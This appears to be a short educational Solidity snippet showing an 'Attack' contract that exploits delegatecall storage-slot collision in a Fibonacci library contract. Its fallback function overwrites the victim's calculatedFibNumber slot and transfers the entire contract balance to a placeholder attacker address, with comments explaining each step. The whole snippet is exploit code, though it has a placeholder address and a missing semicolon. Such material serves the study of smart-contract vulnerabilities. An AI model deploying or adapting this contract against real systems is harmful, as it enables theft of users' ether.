contract Attack {
  uint storageSlot0; // corresponds to fibonacciLibrary
  uint storageSlot1; // corresponds to calculatedFibNumber

  //fallback - this will run if a specified function is not found
  function fallback() public {
    storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
    // is called we don't send out any ether
    <attacker_address>.transfer(this.balance) // we take all the ether
  }
}